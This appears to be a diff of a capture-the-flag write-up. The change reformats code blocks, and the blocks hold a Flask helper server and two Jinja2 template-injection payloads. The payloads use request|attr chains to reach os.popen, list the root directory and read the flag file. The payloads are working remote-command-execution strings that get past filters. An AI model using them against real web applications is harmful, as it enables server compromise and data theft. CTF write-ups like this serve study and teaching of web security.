@@ -83,8 +83,8 @@ the trick is to use print() to understand what to do and retrieve piece by piece
 
 to do this, we should use the token that we get by the registration in this case: ced507500890ab628c7edf15fbe9df2f
 
-{%raw%}
-```
+```html
+<pre><code class="language-python">
 from flask import Flask, Response, request, redirect
 
 app = Flask('__name_')
@@ -100,12 +100,12 @@ def catch(path):
 
     
 app.run(host="0.0.0.0", port=8081, debug=False)
+</code></pre>
 ```
-{%endraw}
 
 So as you can see the payload is the following:
-{%raw%}
-```
+```html
+<pre><code class="language-python">
 List the files in / cause from the code flag.txt is modified like flag[random-chars].txt
 
 directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=ls%20/" 
@@ -113,7 +113,6 @@ directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|
 
 Cat flag
 
-{%raw%}
 directory={%with%20a=((((request|attr('application'))|attr(request|attr('args')|attr('get')('globals')))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('builtins'))|attr(request|attr('args')|attr('get')('getitem')))(request|attr('args')|attr('get')('import'))('os')|attr('popen')(request|attr('args')|attr('get')('cmd'))|attr('read')()%}{%print(a)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=cat%20/flag960bbeb43c.txt
+</code></pre>
 ```
-{%endraw}
